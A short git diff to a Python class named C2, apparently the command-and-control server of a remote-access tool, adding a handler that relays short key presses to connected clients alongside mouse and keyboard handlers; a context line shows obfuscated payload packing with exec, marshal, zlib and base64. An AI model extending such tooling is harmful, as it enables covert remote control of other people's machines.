@@ -43,6 +43,7 @@ class C2:
         self.sio.on("mouse_click_right", self.mouse_click_right)
         self.sio.on("mouse_scroll", self.mouse_scroll)
         self.sio.on("key_press", self.key_press)
+        self.sio.on("key_press_short", self.key_press_short)
 
         print(f"Current time: {datetime.datetime.utcnow()}")
 
@@ -375,3 +376,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
     def key_press(self, sid, data):
         self.sio.emit("key_press", data)
+
+    def key_press_short(self, sid, data):
+        self.sio.emit("key_press_short", data)
